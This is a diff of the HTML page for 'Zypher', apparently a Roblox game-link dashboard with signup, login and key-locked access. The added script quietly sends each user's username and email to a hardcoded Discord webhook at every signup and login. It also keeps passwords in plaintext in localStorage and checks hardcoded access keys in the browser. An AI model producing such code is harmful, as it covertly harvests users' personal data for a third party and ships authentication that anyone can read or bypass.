@@ -1,92 +1,205 @@
+Main:
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Zypher</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 <style>
 :root{--theme:#4c6fff}
 *{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
 body{background:#05070d;color:white;display:flex;min-height:100vh;overflow:hidden}
-.auth-screen{position:fixed;inset:0;background:#05070d;display:flex;align-items:center;justify-content:center}
-.login-container{width:100%;max-width:380px;padding:40px}
-input{width:100%;padding:14px;border-radius:12px;border:none;background:#0c1224;color:white;margin-bottom:15px}
-button{width:100%;padding:14px;background:var(--theme);border:none;border-radius:12px;color:white}
+.auth-screen{position:fixed;inset:0;background:linear-gradient(135deg,#0a0e1a,#05070d);display:flex;align-items:center;justify-content:center;z-index:1000;transition:opacity .6s ease}
+.login-container,.signup-container{text-align:center;width:100%;max-width:380px;padding:40px 30px}
+.welcome-text{font-size:28px;font-weight:600;margin-bottom:8px}
+.subtitle{color:#9aa4c7;margin-bottom:40px;font-size:15px}
+.input-group{margin-bottom:20px;text-align:left}
+label{display:block;margin-bottom:8px;color:#9aa4c7;font-size:14px}
+input{width:100%;padding:14px 16px;border-radius:12px;border:none;background:#0c1224;color:white;font-size:16px;outline:none;transition:.3s}
+input:focus{box-shadow:0 0 0 3px rgba(76,111,255,.3)}
+.password-wrapper{position:relative}
+.eye{position:absolute;right:16px;top:50%;transform:translateY(-50%);color:#9aa4c7;cursor:pointer;font-size:18px}
+.signin-btn,.create-btn{width:100%;padding:14px;background:var(--theme);color:white;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;margin-top:10px;transition:.25s}
+.signin-btn:hover,.create-btn:hover{background:#5e7fff;transform:translateY(-2px);box-shadow:0 0 20px rgba(76,111,255,.5)}
+.signup-text,.signin-text{margin-top:30px;color:#9aa4c7;font-size:14px}
+.signup-text span,.signin-text span{color:var(--theme);cursor:pointer}
 #dashboard{display:none;width:100%;height:100vh}
-.main{flex:1;padding:30px}
+.sidebar{width:240px;background:#0b0e17;padding:25px 15px;display:flex;flex-direction:column;border-right:1px solid rgba(255,255,255,.05)}
+.logo{font-size:22px;font-weight:600;margin-bottom:30px}
+.logo span{color:var(--theme)}
+.plan{background:#141a33;padding:6px 10px;border-radius:6px;font-size:12px;margin-top:6px;display:inline-block;color:var(--theme)}
+.menu{display:flex;flex-direction:column;gap:8px}
+.menu button{display:flex;align-items:center;gap:12px;background:none;border:none;color:#9aa4c7;padding:12px;border-radius:10px;cursor:pointer;font-size:14px;transition:.25s;border:2px solid transparent}
+.menu button:hover{background:#11162b;color:white;transform:translateX(4px);box-shadow:0 0 10px rgba(76,111,255,.25)}
+.menu button:active{transform:scale(.95)}
+.menu .active{background:var(--theme);color:white;border:2px solid #7e9aff;box-shadow:0 0 14px rgba(76,111,255,.6)}
+.main{flex:1;padding:30px;overflow-y:auto}
+.page{display:none;opacity:0;transform:translateY(15px);transition:.35s}
+.page.active{display:block;opacity:1;transform:translateY(0)}
+.header h1{font-size:26px;margin-bottom:25px}
+.header span{color:var(--theme)}
+.card{background:#0c1224;border-radius:14px;padding:20px;display:flex;align-items:center;gap:15px;margin-bottom:20px}
+.card i{font-size:22px;background:var(--theme);padding:12px;border-radius:10px}
+.activity{background:#0c1224;border-radius:14px;padding:20px;margin-top:10px}
+.activity-item{display:flex;justify-content:space-between;align-items:center;background:#090f1f;padding:14px;border-radius:10px}
+.activity-item button{background:var(--theme);border:none;padding:8px 14px;border-radius:8px;color:white;cursor:pointer;transition:.25s}
+.search-container{margin-bottom:20px;position:relative}
+.search-input{width:100%;padding:14px 16px 14px 45px;border-radius:12px;border:none;background:#0c1224;color:white;font-size:16px;outline:none;box-shadow:0 0 0 2px rgba(76,111,255,.1);transition:.3s}
+.search-input:focus{box-shadow:0 0 0 3px rgba(76,111,255,.3)}
+.search-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#9aa4c7;font-size:18px}
+button.action{background:var(--theme);border:none;padding:10px 16px;border-radius:8px;color:white;cursor:pointer;transition:.25s}
 .games{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:25px}
-.gamecard{position:relative;border-radius:20px;overflow:hidden;background:#000;height:200px}
+.gamecard{position:relative;border-radius:20px;overflow:hidden;background:#000;height:200px;display:none}
+.gamecard.visible{display:block}
 .gamecard img{width:100%;height:100%;object-fit:cover;filter:brightness(.6)}
-.gamecontent{position:absolute;bottom:0;padding:20px}
-.gametitle{font-size:20px;font-weight:600}
-.launch{margin-top:10px;background:var(--theme);border:none;padding:8px 14px;border-radius:20px;color:white}
+.gamecontent{position:absolute;top:0;left:0;width:100%;height:100%;padding:20px;display:flex;flex-direction:column;justify-content:flex-end}
+.gametitle{font-size:20px;font-weight:600;margin-bottom:10px}
+.tags{display:flex;gap:8px;margin-bottom:12px}
+.tag{background:rgba(76,111,255,.35);border:1px solid rgba(76,111,255,.6);padding:5px 10px;border-radius:20px;font-size:11px}
+.tag.red{background:rgba(255,0,0,.35);border:1px solid rgba(255,50,50,.7);color:#ffdddd}
+.launch{background:var(--theme);border:none;padding:10px 16px;border-radius:30px;color:white;font-weight:500;cursor:pointer;font-size:13px;width:160px;transition:.2s}
+.launch:hover{transform:scale(1.08);box-shadow:0 0 12px var(--theme)}
+.blurred{filter:blur(8px);pointer-events:none;user-select:none}
+@media(max-width:900px){.sidebar{position:fixed;bottom:0;width:100%;height:65px;flex-direction:row;padding:0;border-right:none;border-top:1px solid rgba(255,255,255,.05)}.logo,.plan{display:none}.menu{flex-direction:row;justify-content:space-around;width:100%}.menu button{flex-direction:column;font-size:11px;gap:4px;padding:8px}.main{padding:20px;padding-bottom:90px}.games{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 
 <div id="login-screen" class="auth-screen">
-<div class="login-container">
-<input id="loginUsername" placeholder="Username">
-<input id="loginPassword" type="password" placeholder="Password">
-<button onclick="login()">Login</button>
+    <div class="login-container">
+        <h1 class="welcome-text">Welcome Back</h1>
+        <p class="subtitle">Sign in to your Zypher account</p>
+        <div class="input-group">
+            <label>Username</label>
+            <input type="text" id="loginUsername" placeholder="Enter your username">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="loginPassword" placeholder="Enter your password">
+                <i class="fa-solid fa-eye eye" id="toggleLoginPassword"></i>
+            </div>
+        </div>
+        <button class="signin-btn" onclick="attemptLogin()">→ Sign In</button>
+        <p class="signup-text">Don't have an account? <span onclick="showSignup()">Sign up</span></p>
+    </div>
 </div>
+
+<div id="signup-screen" class="auth-screen" style="display:none;opacity:0">
+    <div class="signup-container">
+        <h1 class="welcome-text">Create Account</h1>
+        <p class="subtitle">Join Zypher today</p>
+        <div class="input-group">
+            <label>Username</label>
+            <input type="text" id="signupUsername" placeholder="Choose a username">
+        </div>
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="signupEmail" placeholder="Enter your email">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="signupPassword" placeholder="Create a password">
+                <i class="fa-solid fa-eye eye" id="toggleSignupPassword"></i>
+            </div>
+        </div>
+        <div class="input-group">
+            <label>Confirm Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="signupConfirmPassword" placeholder="Confirm your password">
+                <i class="fa-solid fa-eye eye" id="toggleConfirmPassword"></i>
+            </div>
+        </div>
+        <button class="create-btn" onclick="createAccount()">
+            <i class="fa-solid fa-user-plus"></i> Create Account
+        </button>
+        <p class="signin-text">Already have an account? <span onclick="showLogin()">Sign in</span></p>
+    </div>
 </div>
 
 <div id="dashboard">
-<div class="main">
-<div id="gamesContent" class="games"></div>
-</div>
+    <div class="sidebar">
+        <div class="logo">ZY<span>PHER</span><div class="plan" id="planLabel">Nothing</div></div>
+        <div class="menu">
+            <button class="active" onclick="openTab('home',this)"><i class="fa-solid fa-house"></i>Home</button>
+            <button onclick="openTab('whitelist',this)"><i class="fa-solid fa-key"></i>Whitelist</button>
+            <button onclick="openTab('games',this)"><i class="fa-solid fa-gamepad"></i>Games</button>
+            <button onclick="openTab('settings',this)"><i class="fa-solid fa-gear"></i>Settings</button>
+        </div>
+    </div>
+    <div class="main">
+        <div id="home" class="page active">
+            <div class="header"><h1>Welcome back, <span id="username">User</span></h1></div>
+            <div class="card"><i class="fa-solid fa-crown"></i><div><h3>Current Plan</h3><p id="planText">Nothing</p></div></div>
+            <div class="card" style="margin-top:20px"><i class="fa-solid fa-gamepad"></i><div><h3>Games Available</h3><p id="gamesCount">19</p></div></div>
+            <div class="activity"><h3>Recent Activity</h3><div class="activity-item"><span>Games</span><button onclick="goRecent()">Go To</button></div></div>
+            <div class="card" style="margin-top:20px"><i class="fa-solid fa-code-branch"></i><div><h3>Version</h3><p>V2.3</p></div></div>
+        </div>
+        <div id="whitelist" class="page">
+            <h2>Redeem Key</h2>
+            <input id="keybox" placeholder="Enter your key here">
+            <button class="action" onclick="redeem()">Redeem Key</button>
+            <p id="keyresult" style="margin-top:15px;color:#9aa4c7"></p>
+        </div>
+        <div id="games" class="page">
+            <div class="search-container">
+                <i class="fa-solid fa-search search-icon"></i>
+                <input type="text" id="gameSearch" class="search-input" placeholder="Search games...">
+            </div>
+            <div id="gamesContent" class="games blurred">
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-28d78babc49f65a9622e837b84cef0e5/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">Escape From Walls By Brainrots!</div><div class="tags"><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/139978323180972" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t3.rbxcdn.com/180DAY-58d59bfe7584647d43085d18c3e9d679"><div class="gamecontent"><div class="gametitle">Safari WarFare🔫🗡️🦁</div><div class="tags"><div class="tag">PvP</div></div><a href="https://www.roblox.com/games/79283758423880" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-8b3142706595997f492d4ae44b8338d4/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">HORROR BROOKHAVEN</div><div class="tags"><div class="tag">Horror</div></div><a href="https://www.roblox.com/games/82354958606054" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-2487409400032c4e9b4afab6575af1f3/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">[☢️] Steal a Memerot</div><div class="tags"><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/140694733757617" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t6.rbxcdn.com/180DAY-3de571ed1175636497776c44426b9765"><div class="gamecontent"><div class="gametitle">candy obby [ADMIN ABUSE]</div><div class="tags"><div class="tag">Obby</div></div><a href="https://www.roblox.com/games/77440417917542" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-1af5b86185469adfd35a0110d42f90fc/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">Kirov RP</div><div class="tags"><div class="tag">RP</div></div><a href="https://www.roblox.com/games/104663575229835" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-ce5f9ff2899184667f796765b7947939/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">{BETA} Bisaya Hangout Relapse Tara tambay!</div><div class="tags"><div class="tag">Hangout</div><div class="tag red">Uninfected</div></div><a href="https://www.roblox.com/games/81128955313015" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t3.rbxcdn.com/180DAY-e559fde711d62cc11604158b5f39187c"><div class="gamecontent"><div class="gametitle">[AHORA]Escapa Del Tsunami Por mini Brainrots</div><div class="tags"><div class="tag">Escape</div></div><a href="https://www.roblox.com/games/81463678716387" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-c684be1e6b6b8127fd4a45126551221a/768/432/Image/Png/noFilter"><div class="gamecontent"><div class="gametitle">Doggy Walk Simulator</div><div class="tags"><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/76661153422640" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-3fd204cee7e51dedf72ff16fd7849dcd/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">CLICK TO GODMODE: INFINITE ASCENSION</div><div class="tags"><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/92333379027390" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-931acef35c3d23ad6627b7452bcd510f/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">[ 🌑 ]Survive Tsunami For Brainrots!</div><div class="tags"><div class="tag">Survival</div></div><a href="https://www.roblox.com/games/114720820797718" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-173a0171fa05cfbc89a87fc30adabd41/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">[🪐] Meme Chest Simulator</div><div class="tags"><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/111312094596605" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t1.rbxcdn.com/180DAY-5122734d944cbdf2dd3799d142e6ec9e"><div class="gamecontent"><div class="gametitle">[CONSOLE] Steal a Brainrot [CONTENT SERVER]</div><div class="tags"><div class="tag">Simulator</div><div class="tag">Console</div></div><a href="https://www.roblox.com/games/108197681008793" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t5.rbxcdn.com/180DAY-c239841c976f825fcf18284efdd1955a"><div class="gamecontent"><div class="gametitle">(RELEASED) Wallhop For Brainrots!🧗</div><div class="tags"><div class="tag">Obby</div><div class="tag">Parkour</div></div><a href="https://www.roblox.com/games/78728987066365" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-a2799d7681bb3de2a9491e73c6cd6799/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">survive the hospital</div><div class="tags"><div class="tag">Horror</div><div class="tag">Survival</div></div><a href="https://www.roblox.com/games/91998692525512" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t2.rbxcdn.com/180DAY-67b2be37ae31be00ab1319901b9d8347"><div class="gamecontent"><div class="gametitle">Roblox Tycoon Simulator</div><div class="tags"><div class="tag">Tycoon</div><div class="tag">Simulator</div></div><a href="https://www.roblox.com/games/123703214404726" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-64ed83b556c759e8e2cd5b3f495c72a6/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">Survive LAVA for Brainrots!</div><div class="tags"><div class="tag">Survival</div><div class="tag">Brainrot</div></div><a href="https://www.roblox.com/games/114720820797718" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://t3.rbxcdn.com/180DAY-3b2ec062707376a89a223ea44c20d408"><div class="gamecontent"><div class="gametitle">The rake</div><div class="tags"><div class="tag">Horror</div><div class="tag">Survival</div></div><a href="https://www.roblox.com/games/95489353515755" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i> Launch Game</button></a></div></div>
+                <div class="gamecard visible"><img src="https://tr.rbxcdn.com/180DAY-f0a7d44406d48c7286d8130fc37a48b5/768/432/Image/Webp/noFilter"><div class="gamecontent"><div class="gametitle">[ST PATRICKS DAY] Build a Brainrot Tycoon</div><div class="tags"><div class="tag">Tycoon</div></div><a href="https://www.roblox.com/games/77575557167707" target="_blank"><button class="launch"><i class="fa-solid fa-play"></i>Launch Game</button></a></div></div>
+            </div>
+        </div>
+        <div id="settings" class="page">
+            <h2>Settings</h2>
+            <label>Username</label>
+            <input id="usernameInput" placeholder="Enter username">
+            <button class="action" onclick="saveUsername()">Save Username</button>
+        </div>
+    </div>
 </div>
 
 <script>
-function login(){
-const user=document.getElementById("loginUsername").value.trim();
-const pass=document.getElementById("loginPassword").value.trim();
-const raw=localStorage.getItem("accounts");
-if(!raw){alert("No accounts saved");return;}
-let accounts=[];
-try{accounts=JSON.parse(raw);}catch{alert("Corrupted data");return;}
-const found=accounts.find(acc=>acc.username===user&&acc.password===pass);
-if(!found){alert("Wrong username or password");return;}
-document.getElementById("login-screen").style.display="none";
-document.getElementById("dashboard").style.display="flex";
-loadGames();
-}
-
-async function loadGames(){
-const container=document.getElementById("gamesContent");
-container.innerHTML="";
-try{
-const res=await fetch("/api/games");
-const data=await res.json();
-const games=data.games||[];
-if(games.length===0){container.innerHTML='<p style="text-align:center;color:white;">No games found</p>';return;}
-for(const game of games){
-let imageUrl="https://via.placeholder.com/768x432/111/eee?text=No+Thumbnail";
-try{
-const t=await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${game.placeId}&size=512x512&format=Png&isCircular=false`);
-const j=await t.json();
-if(j.data&&j.data[0]&&j.data[0].imageUrl) imageUrl=j.data[0].imageUrl;
-}catch{}
-const card=`
-<div class="gamecard">
-<img src="${imageUrl}">
-<div class="gamecontent">
-<div class="gametitle">${game.name}</div>
-<a href="https://www.roblox.com/games/${game.placeId}" target="_blank">
-<button class="launch">Launch Game</button>
-</a>
-</div>
-</div>`;
-container.insertAdjacentHTML("beforeend",card);
-}
-}catch{
-container.innerHTML='<p style="color:red;text-align:center;">Failed to load</p>';
-}
-}
-
-setInterval(loadGames,60000);
+let users=JSON.parse(localStorage.getItem("zypherUsers"))||{};
+const WEBHOOK_URL="https://discord.com/api/webhooks/1483059077645992016/blew1E6_1L_upTzvV1phD-nWpEeqLMlOem4isYGEF7_zIwzhJmuirMOuhsyaETGBH8XU";
+function showSignup(){document.getElementById("login-screen").style.opacity="0";setTimeout(()=>{document.getElementById("login-screen").style.display="none";let s=document.getElementById("signup-screen");s.style.display="flex";s.style.opacity="1"},600)}
+function showLogin(){document.getElementById("signup-screen").style.opacity="0";setTimeout(()=>{document.getElementById("signup-screen").style.display="none";let l=document.getElementById("login-screen");l.style.display="flex";l.style.opacity="1"},600)}
+async function createAccount(){let u=document.getElementById("signupUsername").value.trim(),e=document.getElementById("signupEmail").value.trim(),p=document.getElementById("signupPassword").value,c=document.getElementById("signupConfirmPassword").value;if(!u||!e||!p||!c){alert("Please fill in all fields.");return}if(p!==c){alert("Passwords do not match!");return}if(users[u]){alert("Username already exists!");return}users[u]={password:p,email:e};localStorage.setItem("zypherUsers",JSON.stringify(users));try{await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"Zypher Website",description:`**Username:** ${u}\n**Email:** ${e}`,color:0x4c6fff}]})})}catch(err){}alert("Account created successfully!\n\nYou can now sign in.");showLogin()}
+async function attemptLogin(){let u=document.getElementById("loginUsername").value.trim(),p=document.getElementById("loginPassword").value;if(!u||!p){alert("Please fill in both Username and Password.");return}if(users[u]&&users[u].password===p){let e=users[u].email||"[No email saved]";try{await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"Zypher Website",description:`**Username:** ${u}\n**Email:** ${e}`,color:0x4c6fff}]})})}catch(err){}document.getElementById("login-screen").style.opacity="0";setTimeout(()=>{document.getElementById("login-screen").style.display="none";document.getElementById("dashboard").style.display="flex";document.getElementById("username").textContent=u;localStorage.setItem("currentUser",u)},600)}else{alert("Invalid username or password!")}}
+function togglePassword(i,id){let inp=document.getElementById(id);if(inp.type==="password"){inp.type="text";i.classList.replace("fa-eye","fa-eye-slash")}else{inp.type="password";i.classList.replace("fa-eye-slash","fa-eye")}}
+document.getElementById("toggleLoginPassword").addEventListener("click",function(){togglePassword(this,"loginPassword")});
+document.getElementById("toggleSignupPassword").addEventListener("click",function(){togglePassword(this,"signupPassword")});
+document.getElementById("toggleConfirmPassword").addEventListener("click",function(){togglePassword(this,"signupConfirmPassword")});
+const validKeys=["key_2o273737eu8373uejeje883838eisidjdj383938s88d8d8d7e7euu32i2i2uejed99d8d83i3i3","key_2o2838i3u3u3u3ueuehehei8e8e8eieididjdjdjjrjejejejejejejeid8d8dejeje","key_eeeijejejejejejejeeieisisidiidieiei3ieieiejejejdjjdd8d88d7eueyehehejejekeeie8"];
+function openTab(t,b){document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));document.getElementById(t).classList.add("active");document.querySelectorAll(".menu button").forEach(btn=>btn.classList.remove("active"));b.classList.add("active")}
+function goRecent(){document.querySelectorAll(".menu button")[2].click()}
+function redeem(){let k=document.getElementById("keybox").value.trim();if(validKeys.includes(k)){localStorage.setItem("whitelisted","true");document.getElementById("keyresult").innerText="Key redeemed successfully";unlockGames()}else{document.getElementById("keyresult").innerText="Invalid key"}}
+function unlockGames(){document.getElementById("gamesContent").classList.remove("blurred");document.getElementById("planText").innerText="Whitelisted";document.getElementById("planLabel").innerText="Whitelisted"}
+function saveUsername(){let n=document.getElementById("usernameInput").value.trim();if(n){localStorage.setItem("username",n);document.getElementById("username").textContent=n}}
+if(localStorage.getItem("currentUser")){document.getElementById("username").textContent=localStorage.getItem("currentUser")}
+if(localStorage.getItem("whitelisted")){unlockGames()}
+document.getElementById("gameSearch").addEventListener("input",function(e){let term=e.target.value.toLowerCase().trim(),cards=document.querySelectorAll(".gamecard"),count=0;cards.forEach(c=>{let title=c.querySelector(".gametitle").textContent.toLowerCase();if(term===""||title.includes(term)){c.classList.add("visible");count++}else{c.classList.remove("visible")}});document.getElementById("gamesCount").textContent=count});
 </script>
-
 </body>
-</html>
+              </html>
